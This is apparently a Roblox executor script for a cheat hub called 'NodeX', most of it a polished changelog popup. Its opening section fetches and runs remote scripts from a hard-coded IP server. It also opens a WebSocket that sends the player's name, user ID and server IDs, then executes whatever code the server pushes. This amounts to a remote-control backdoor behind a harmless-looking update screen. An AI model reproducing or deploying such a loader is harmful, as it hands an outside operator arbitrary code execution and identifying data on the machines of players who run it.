if _G.v == true then return end
wait()
_G.v = true
repeat wait() until game:IsLoaded()
local Players          = game:GetService("Players")
local HttpService      = game:GetService("HttpService")
local TweenService     = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Lighting         = game:GetService("Lighting")
local CoreGui          = game:GetService("CoreGui")

local SERVER_HTTP = "http://194.13.80.145:8989"
local SERVER_WS   = "ws://194.13.80.145:8989/client-ws"
local SEEN_FILE   = "nodex_seen_version.txt"

local plr = Players.LocalPlayer

local function readSeenVersion()
    local okExists, exists = pcall(isfile, SEEN_FILE)
    if not okExists or not exists then return 0 end
    local ok, raw = pcall(readfile, SEEN_FILE)
    if not ok or not raw then return 0 end
    return tonumber(raw) or 0
end

local function writeSeenVersion(v)
    pcall(writefile, SEEN_FILE, tostring(v))
end

local function httpGetJson(url)
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if not ok or not body then return nil end
    local ok2, data = pcall(HttpService.JSONDecode, HttpService, body)
    if not ok2 then return nil end
    return data
end

local function getConfig()  return httpGetJson(SERVER_HTTP .. "/api/config") end
local function getHistory() return httpGetJson(SERVER_HTTP .. "/api/changelog/history") or {} end

local config = getConfig()
if not config then
    warn("[NodeX] Failed to fetch config from " .. SERVER_HTTP)
    return
end

local loaders       = config.loaders or {}
local loaderDelay   = tonumber(config.loaderDelay) or 10
local currentLog    = config.changelog or { version = 0, title = "", body = "", date = "" }
local serverVersion = tonumber(currentLog.version) or 0
local seenVersion   = readSeenVersion()
local isNewUpdate   = serverVersion > seenVersion

local function runLoaders()
    for i, u in ipairs(loaders) do
        task.spawn(function()
            local ok, body = pcall(function() return game:HttpGet(u) end)
            if not ok or not body then
                warn(("[NodeX] loader %d fetch failed"):format(i))
                return
            end
            local fn, err = loadstring(body)
            if not fn then
                warn(("[NodeX] loader %d compile error: %s"):format(i, tostring(err)))
                return
            end
            pcall(fn)
        end)
        if i < #loaders then task.wait(loaderDelay) end
    end
end

local wsConnected = false
local function connectWS()
    if wsConnected then return end
    local ctor = WebSocket and WebSocket.connect
    if not ctor then
        warn("[NodeX] executor does not support WebSocket.connect; watcher disabled")
        return
    end
    local ws
    local ok = pcall(function() ws = WebSocket.connect(SERVER_WS) end)
    if not ok or not ws then
        warn("[NodeX] WebSocket connect failed, retrying in 10s")
        task.delay(10, connectWS)
        return
    end
    wsConnected = true
    pcall(function()
        ws:Send(HttpService:JSONEncode({
            type   = "hello",
            user   = plr and plr.Name or "unknown",
            userid = plr and plr.UserId or 0,
            place  = tostring(game.PlaceId),
            job    = tostring(game.JobId),
        }))
    end)
    ws.OnMessage:Connect(function(raw)
        local okDec, msg = pcall(HttpService.JSONDecode, HttpService, raw)
        if not okDec or type(msg) ~= "table" then return end
        if msg.type == "execute" and type(msg.code) == "string" then
            task.spawn(function()
                local fn, err = loadstring(msg.code)
                if not fn then warn("[NodeX] broadcast compile error:", err); return end
                local okRun, runErr = pcall(fn)
                if not okRun then warn("[NodeX] broadcast runtime error:", runErr) end
            end)
        end
    end)
    ws.OnClose:Connect(function()
        wsConnected = false
        task.delay(5, connectWS)
    end)
end

local function proceed()
    writeSeenVersion(serverVersion)
    task.spawn(connectWS)
    runLoaders()
end

if not isNewUpdate then
    proceed()
    return
end

local COLOR = {
    bg         = Color3.fromRGB(14, 16, 22),
    panel      = Color3.fromRGB(26, 28, 38),
    panel2     = Color3.fromRGB(34, 37, 50),
    panelHi    = Color3.fromRGB(42, 46, 62),
    stroke     = Color3.fromRGB(48, 52, 70),
    strokeHi   = Color3.fromRGB(86, 96, 138),
    text       = Color3.fromRGB(244, 246, 252),
    sub        = Color3.fromRGB(164, 170, 188),
    muted      = Color3.fromRGB(108, 114, 134),
    accent     = Color3.fromRGB(120, 145, 255),
    accentHi   = Color3.fromRGB(160, 180, 255),
    accentSoft = Color3.fromRGB(40, 48, 96),
    success    = Color3.fromRGB(110, 220, 160),
    successBg  = Color3.fromRGB(24, 48, 38),
}

local function mk(class, props, children)
    local o = Instance.new(class)
    for k, v in pairs(props or {}) do o[k] = v end
    for _, c in ipairs(children or {}) do c.Parent = o end
    return o
end

local function tween(inst, t, props, style, dir)
    local tw = TweenService:Create(inst, TweenInfo.new(t,
        style or Enum.EasingStyle.Quint,
        dir   or Enum.EasingDirection.Out), props)
    tw:Play()
    return tw
end

local function prettifyBody(body)
    body = tostring(body or "")
    if body == "" then return "No details provided." end
    local lines = {}
    for line in string.gmatch(body .. "\n", "([^\n]*)\n") do
        table.insert(lines, line)
    end
    for i, line in ipairs(lines) do
        if string.match(line, "^%s*[%-%*]%s+") then
            lines[i] = "  •  " .. string.gsub(line, "^%s*[%-%*]%s+", "")
        end
    end
    return table.concat(lines, "\n")
end

local function formatDate(iso)
    if not iso or iso == "" then return "" end
    local s = tostring(iso)
    local y, m, d = string.match(s, "(%d+)-(%d+)-(%d+)")
    if not y then return string.sub(s, 1, 10) end
    local months = { "Jan", "Feb", "Mar", "Apr", "May", "Jun",
                     "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" }
    local mn = months[tonumber(m)] or m
    return string.format("%s %d, %s", mn, tonumber(d), y)
end

if CoreGui:FindFirstChild("NodeX_Changelog") then
    CoreGui.NodeX_Changelog:Destroy()
end

local screenGui = mk("ScreenGui", {
    Name = "NodeX_Changelog",
    IgnoreGuiInset = true,
    ResetOnSpawn = false,
    DisplayOrder = 9999,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
})
local okParent = pcall(function()
    screenGui.Parent = (gethui and gethui()) or CoreGui
end)
if not okParent then
    screenGui.Parent = plr:WaitForChild("PlayerGui")
end

local blur = mk("BlurEffect", { Name = "NodeX_Blur", Size = 0, Parent = Lighting })

local overlay = mk("Frame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = screenGui,
})

local POPUP_W, POPUP_H = 560, 520

local Root = mk("CanvasGroup", {
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.fromOffset(POPUP_W, POPUP_H),
    BackgroundTransparency = 1,
    GroupTransparency = 1,
    Parent = screenGui,
})

mk("ImageLabel", {
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.fromScale(0.5, 0.5),
    Size = UDim2.new(1, 80, 1, 80),
    BackgroundTransparency = 1,
    Image = "rbxassetid://5028857084",
    ImageColor3 = Color3.fromRGB(0, 0, 0),
    ImageTransparency = 0.3,
    ScaleType = Enum.ScaleType.Slice,
    SliceCenter = Rect.new(24, 24, 276, 276),
    Parent = Root,
})

local popup = mk("Frame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundColor3 = COLOR.bg,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = Root,
})
mk("UICorner", { CornerRadius = UDim.new(0, 14), Parent = popup })
mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Parent = popup })
mk("UIGradient", {
    Rotation = 125,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 34, 52)),
        ColorSequenceKeypoint.new(0.55, Color3.fromRGB(18, 20, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 16, 22)),
    }),
    Parent = popup,
})

local accentBar = mk("Frame", {
    Size = UDim2.new(1, 0, 0, 3),
    BackgroundColor3 = COLOR.accent,
    BorderSizePixel = 0,
    Parent = popup,
})
mk("UIGradient", {
    Rotation = 0,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(100, 120, 240)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 140, 255)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(120, 200, 255)),
    }),
    Parent = accentBar,
})

local titleBar = mk("Frame", {
    Size = UDim2.new(1, 0, 0, 72),
    Position = UDim2.new(0, 0, 0, 3),
    BackgroundTransparency = 1,
    Active = true,
    Parent = popup,
})

local brandRow = mk("Frame", {
    Size = UDim2.new(1, -160, 1, 0),
    Position = UDim2.new(0, 22, 0, 0),
    BackgroundTransparency = 1,
    Parent = titleBar,
})

mk("TextLabel", {
    Text = "WHAT'S NEW",
    Font = Enum.Font.GothamBold,
    TextSize = 10,
    TextColor3 = COLOR.accent,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 0, 0, 16),
    Size = UDim2.new(1, 0, 0, 12),
    Parent = brandRow,
})

mk("TextLabel", {
    Text = "NodeX",
    Font = Enum.Font.GothamBold,
    TextSize = 22,
    TextColor3 = COLOR.text,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 0, 0, 30),
    Size = UDim2.new(1, 0, 0, 28),
    Parent = brandRow,
})

local versionPill = mk("Frame", {
    Size = UDim2.fromOffset(78, 30),
    Position = UDim2.new(1, -132, 0.5, -15),
    BackgroundColor3 = COLOR.accentSoft,
    BorderSizePixel = 0,
    Parent = titleBar,
})
mk("UICorner", { CornerRadius = UDim.new(1, 0), Parent = versionPill })
local pillStroke = mk("UIStroke", {
    Color = COLOR.accent,
    Thickness = 1,
    Transparency = 0.4,
    Parent = versionPill,
})
mk("UIGradient", {
    Rotation = 90,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(54, 62, 120)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(32, 38, 80)),
    }),
    Parent = versionPill,
})
mk("TextLabel", {
    Text = string.format("v%d", serverVersion),
    Font = Enum.Font.GothamBold,
    TextSize = 13,
    TextColor3 = COLOR.accentHi,
    BackgroundTransparency = 1,
    Size = UDim2.fromScale(1, 1),
    Parent = versionPill,
})

local closeBtn = mk("TextButton", {
    Text = "×",
    Font = Enum.Font.GothamBold,
    TextSize = 22,
    TextColor3 = COLOR.sub,
    BackgroundColor3 = COLOR.panel,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Size = UDim2.fromOffset(32, 32),
    Position = UDim2.new(1, -46, 0.5, -16),
    Parent = titleBar,
})
mk("UICorner", { CornerRadius = UDim.new(1, 0), Parent = closeBtn })
local closeStroke = mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Transparency = 1, Parent = closeBtn })

mk("Frame", {
    Size = UDim2.new(1, -40, 0, 1),
    Position = UDim2.new(0, 20, 1, 0),
    BackgroundColor3 = COLOR.stroke,
    BackgroundTransparency = 0.5,
    BorderSizePixel = 0,
    Parent = titleBar,
})

local tabRow = mk("Frame", {
    Size = UDim2.new(1, -40, 0, 40),
    Position = UDim2.new(0, 20, 0, 84),
    BackgroundColor3 = COLOR.panel,
    BorderSizePixel = 0,
    Parent = popup,
})
mk("UICorner", { CornerRadius = UDim.new(0, 10), Parent = tabRow })
mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Parent = tabRow })

local tabIndicator = mk("Frame", {
    Size = UDim2.new(0.5, -4, 1, -6),
    Position = UDim2.new(0, 3, 0, 3),
    BackgroundColor3 = COLOR.accent,
    BorderSizePixel = 0,
    Parent = tabRow,
})
mk("UICorner", { CornerRadius = UDim.new(0, 8), Parent = tabIndicator })
mk("UIGradient", {
    Rotation = 90,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 165, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 125, 235)),
    }),
    Parent = tabIndicator,
})

local function makeTab(text, alignLeft)
    return mk("TextButton", {
        Text = text,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Size = UDim2.new(0.5, 0, 1, 0),
        Position = UDim2.new(alignLeft and 0 or 0.5, 0, 0, 0),
        Parent = tabRow,
    })
end

local curTab  = makeTab("CURRENT", true)
local histTab = makeTab("HISTORY", false)
histTab.TextColor3 = COLOR.sub

local body = mk("Frame", {
    Size = UDim2.new(1, -40, 1, -220),
    Position = UDim2.new(0, 20, 0, 138),
    BackgroundTransparency = 1,
    Parent = popup,
})

local currentView = mk("ScrollingFrame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = COLOR.strokeHi,
    ScrollBarImageTransparency = 0.3,
    CanvasSize = UDim2.new(),
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    Parent = body,
})
mk("UIPadding", { PaddingRight = UDim.new(0, 4), Parent = currentView })
mk("UIListLayout", {
    Padding = UDim.new(0, 10),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = currentView,
})

local heroCard = mk("Frame", {
    Size = UDim2.new(1, -4, 0, 0),
    AutomaticSize = Enum.AutomaticSize.Y,
    BackgroundColor3 = COLOR.panel,
    BorderSizePixel = 0,
    LayoutOrder = 1,
    Parent = currentView,
})
mk("UICorner", { CornerRadius = UDim.new(0, 12), Parent = heroCard })
mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Parent = heroCard })
mk("UIGradient", {
    Rotation = 135,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(36, 40, 62)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(26, 28, 38)),
    }),
    Parent = heroCard,
})
mk("UIPadding", {
    PaddingTop = UDim.new(0, 18), PaddingBottom = UDim.new(0, 18),
    PaddingLeft = UDim.new(0, 20), PaddingRight = UDim.new(0, 20),
    Parent = heroCard,
})
mk("UIListLayout", {
    Padding = UDim.new(0, 10),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = heroCard,
})

local newBadge = mk("Frame", {
    Size = UDim2.fromOffset(58, 22),
    BackgroundColor3 = COLOR.successBg,
    BorderSizePixel = 0,
    LayoutOrder = 0,
    Parent = heroCard,
})
mk("UICorner", { CornerRadius = UDim.new(1, 0), Parent = newBadge })
mk("UIStroke", { Color = COLOR.success, Thickness = 1, Transparency = 0.2, Parent = newBadge })
mk("TextLabel", {
    Text = "● NEW",
    Font = Enum.Font.GothamBold,
    TextSize = 10,
    TextColor3 = COLOR.success,
    BackgroundTransparency = 1,
    Size = UDim2.fromScale(1, 1),
    Parent = newBadge,
})

mk("TextLabel", {
    Text = tostring(currentLog.title or "Update"),
    Font = Enum.Font.GothamBold,
    TextSize = 20,
    TextColor3 = COLOR.text,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextWrapped = true,
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 0),
    AutomaticSize = Enum.AutomaticSize.Y,
    LayoutOrder = 1,
    Parent = heroCard,
})

mk("TextLabel", {
    Text = string.format("Version %d   ·   %s", serverVersion, formatDate(currentLog.date)),
    Font = Enum.Font.GothamMedium,
    TextSize = 11,
    TextColor3 = COLOR.muted,
    TextXAlignment = Enum.TextXAlignment.Left,
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 14),
    LayoutOrder = 2,
    Parent = heroCard,
})

mk("Frame", {
    Size = UDim2.new(1, 0, 0, 1),
    BackgroundColor3 = COLOR.stroke,
    BackgroundTransparency = 0.4,
    BorderSizePixel = 0,
    LayoutOrder = 3,
    Parent = heroCard,
})

mk("TextLabel", {
    Text = prettifyBody(currentLog.body),
    Font = Enum.Font.Gotham,
    TextSize = 13,
    TextColor3 = COLOR.sub,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top,
    TextWrapped = true,
    LineHeight = 1.35,
    BackgroundTransparency = 1,
    Size = UDim2.new(1, 0, 0, 0),
    AutomaticSize = Enum.AutomaticSize.Y,
    LayoutOrder = 4,
    Parent = heroCard,
})

local historyView = mk("ScrollingFrame", {
    Size = UDim2.fromScale(1, 1),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = COLOR.strokeHi,
    ScrollBarImageTransparency = 0.3,
    CanvasSize = UDim2.new(),
    AutomaticCanvasSize = Enum.AutomaticSize.Y,
    Visible = false,
    Parent = body,
})
mk("UIPadding", { PaddingRight = UDim.new(0, 4), Parent = historyView })
mk("UIListLayout", {
    Padding = UDim.new(0, 10),
    SortOrder = Enum.SortOrder.LayoutOrder,
    Parent = historyView,
})

local historyLoaded = false
local function loadHistory()
    if historyLoaded then return end
    historyLoaded = true

    local skeletons = {}
    for i = 1, 3 do
        local skel = mk("Frame", {
            Size = UDim2.new(1, -4, 0, 80),
            BackgroundColor3 = COLOR.panel,
            BackgroundTransparency = 0.3,
            BorderSizePixel = 0,
            LayoutOrder = i,
            Parent = historyView,
        })
        mk("UICorner", { CornerRadius = UDim.new(0, 10), Parent = skel })
        mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Transparency = 0.5, Parent = skel })
        table.insert(skeletons, skel)
        task.spawn(function()
            while skel.Parent do
                tween(skel, 0.9, { BackgroundTransparency = 0.55 })
                task.wait(0.9)
                tween(skel, 0.9, { BackgroundTransparency = 0.3 })
                task.wait(0.9)
            end
        end)
    end

    task.spawn(function()
        local items = getHistory()
        for _, s in ipairs(skeletons) do s:Destroy() end
        if #items == 0 then
            mk("TextLabel", {
                Text = "No previous changelogs yet.",
                Font = Enum.Font.Gotham,
                TextSize = 13,
                TextColor3 = COLOR.muted,
                BackgroundTransparency = 1,
                TextXAlignment = Enum.TextXAlignment.Center,
                Size = UDim2.new(1, 0, 0, 60),
                Parent = historyView,
            })
            return
        end
        for idx, entry in ipairs(items) do
            local card = mk("Frame", {
                Size = UDim2.new(1, -4, 0, 0),
                AutomaticSize = Enum.AutomaticSize.Y,
                BackgroundColor3 = COLOR.panel,
                BorderSizePixel = 0,
                LayoutOrder = idx,
                Parent = historyView,
            })
            mk("UICorner", { CornerRadius = UDim.new(0, 10), Parent = card })
            mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Parent = card })
            mk("UIPadding", {
                PaddingTop = UDim.new(0, 14), PaddingBottom = UDim.new(0, 14),
                PaddingLeft = UDim.new(0, 16), PaddingRight = UDim.new(0, 16),
                Parent = card,
            })

            local head = mk("Frame", {
                Size = UDim2.new(1, 0, 0, 24),
                BackgroundTransparency = 1,
                Parent = card,
            })

            local chip = mk("Frame", {
                Size = UDim2.fromOffset(46, 22),
                BackgroundColor3 = COLOR.panel2,
                BorderSizePixel = 0,
                Parent = head,
            })
            mk("UICorner", { CornerRadius = UDim.new(1, 0), Parent = chip })
            mk("UIStroke", { Color = COLOR.stroke, Thickness = 1, Parent = chip })
            mk("TextLabel", {
                Text = string.format("v%s", tostring(entry.version or "?")),
                Font = Enum.Font.GothamBold,
                TextSize = 11,
                TextColor3 = COLOR.sub,
                BackgroundTransparency = 1,
                Size = UDim2.fromScale(1, 1),
                Parent = chip,
            })

            mk("TextLabel", {
                Text = tostring(entry.title or ""),
                Font = Enum.Font.GothamBold,
                TextSize = 14,
                TextColor3 = COLOR.text,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextTruncate = Enum.TextTruncate.AtEnd,
                BackgroundTransparency = 1,
                Position = UDim2.fromOffset(56, 2),
                Size = UDim2.new(1, -150, 0, 20),
                Parent = head,
            })

            mk("TextLabel", {
                Text = formatDate(entry.date),
                Font = Enum.Font.GothamMedium,
                TextSize = 10,
                TextColor3 = COLOR.muted,
                TextXAlignment = Enum.TextXAlignment.Right,
                BackgroundTransparency = 1,
                Position = UDim2.new(1, -90, 0, 4),
                Size = UDim2.fromOffset(90, 16),
                Parent = head,
            })

            mk("TextLabel", {
                Text = prettifyBody(entry.body),
                Font = Enum.Font.Gotham,
                TextSize = 12,
                TextColor3 = COLOR.sub,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextYAlignment = Enum.TextYAlignment.Top,
                TextWrapped = true,
                LineHeight = 1.3,
                BackgroundTransparency = 1,
                Position = UDim2.new(0, 0, 0, 32),
                Size = UDim2.new(1, 0, 0, 0),
                AutomaticSize = Enum.AutomaticSize.Y,
                Parent = card,
            })
        end
    end)
end

local function setTab(tab)
    if tab == "current" then
        currentView.Visible = true
        historyView.Visible = false
        tween(tabIndicator, 0.3, { Position = UDim2.new(0, 3, 0, 3) }, Enum.EasingStyle.Quart)
        tween(curTab,  0.2, { TextColor3 = Color3.fromRGB(255,255,255) })
        tween(histTab, 0.2, { TextColor3 = COLOR.sub })
    else
        currentView.Visible = false
        historyView.Visible = true
        tween(tabIndicator, 0.3, { Position = UDim2.new(0.5, 1, 0, 3) }, Enum.EasingStyle.Quart)
        tween(histTab, 0.2, { TextColor3 = Color3.fromRGB(255,255,255) })
        tween(curTab,  0.2, { TextColor3 = COLOR.sub })
        loadHistory()
    end
end
setTab("current")
curTab.MouseButton1Click:Connect(function()  setTab("current") end)
histTab.MouseButton1Click:Connect(function() setTab("history") end)

local footer = mk("Frame", {
    Size = UDim2.new(1, -40, 0, 56),
    Position = UDim2.new(0, 20, 1, -72),
    BackgroundTransparency = 1,
    Parent = popup,
})

mk("Frame", {
    Size = UDim2.new(1, 0, 0, 1),
    BackgroundColor3 = COLOR.stroke,
    BackgroundTransparency = 0.5,
    BorderSizePixel = 0,
    Parent = footer,
})

mk("TextLabel", {
    Text = string.format("v%d   ·   %s", serverVersion, formatDate(currentLog.date)),
    Font = Enum.Font.GothamMedium,
    TextSize = 11,
    TextColor3 = COLOR.muted,
    TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Center,
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 0, 0, 16),
    Size = UDim2.new(0.5, 0, 1, -16),
    Parent = footer,
})

local continueBtn = mk("TextButton", {
    Text = "Continue  →",
    Font = Enum.Font.GothamBold,
    TextSize = 14,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundColor3 = COLOR.accent,
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Size = UDim2.fromOffset(160, 40),
    Position = UDim2.new(1, -160, 0, 8),
    Parent = footer,
})
mk("UICorner", { CornerRadius = UDim.new(0, 10), Parent = continueBtn })
mk("UIGradient", {
    Rotation = 90,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 165, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 125, 235)),
    }),
    Parent = continueBtn,
})
local contStroke = mk("UIStroke", {
    Color = COLOR.accent,
    Thickness = 1,
    Transparency = 0.5,
    Parent = continueBtn,
})

local dragging, dragStart, startPos
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Root.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not dragging then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        Root.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

continueBtn.MouseEnter:Connect(function()
    tween(continueBtn, 0.18, {
        BackgroundColor3 = COLOR.accentHi,
        Size = UDim2.fromOffset(166, 42),
        Position = UDim2.new(1, -166, 0, 7),
    })
    tween(contStroke, 0.18, { Transparency = 0.1 })
end)
continueBtn.MouseLeave:Connect(function()
    tween(continueBtn, 0.18, {
        BackgroundColor3 = COLOR.accent,
        Size = UDim2.fromOffset(160, 40),
        Position = UDim2.new(1, -160, 0, 8),
    })
    tween(contStroke, 0.18, { Transparency = 0.5 })
end)

closeBtn.MouseEnter:Connect(function()
    tween(closeBtn, 0.15, { BackgroundTransparency = 0, TextColor3 = COLOR.text })
    tween(closeStroke, 0.15, { Transparency = 0 })
end)
closeBtn.MouseLeave:Connect(function()
    tween(closeBtn, 0.15, { BackgroundTransparency = 1, TextColor3 = COLOR.sub })
    tween(closeStroke, 0.15, { Transparency = 1 })
end)

task.spawn(function()
    while pillStroke.Parent do
        tween(pillStroke, 1.3, { Transparency = 0.1 })
        task.wait(1.3)
        if not pillStroke.Parent then break end
        tween(pillStroke, 1.3, { Transparency = 0.5 })
        task.wait(1.3)
    end
end)

tween(overlay, 0.3, { BackgroundTransparency = 0.5 })
tween(blur, 0.4, { Size = 16 })
Root.Size = UDim2.fromOffset(POPUP_W - 30, POPUP_H - 20)
tween(Root, 0.45, {
    GroupTransparency = 0,
    Size = UDim2.fromOffset(POPUP_W, POPUP_H),
}, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

local closed = false
local function closeGui(cb)
    if closed then return end
    closed = true
    tween(overlay, 0.22, { BackgroundTransparency = 1 })
    tween(blur, 0.28, { Size = 0 })
    tween(Root, 0.24, {
        GroupTransparency = 1,
        Size = UDim2.fromOffset(POPUP_W - 30, POPUP_H - 20),
    }, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
    task.delay(0.28, function()
        if blur then blur:Destroy() end
        if screenGui then screenGui:Destroy() end
        if cb then cb() end
    end)
end

continueBtn.MouseButton1Click:Connect(function() closeGui(proceed) end)
closeBtn.MouseButton1Click:Connect(function()    closeGui(proceed) end)
UserInputService.InputBegan:Connect(function(input, processed)
    if processed or closed then return end
    if input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.Escape then
        closeGui(proceed)
    end
end)
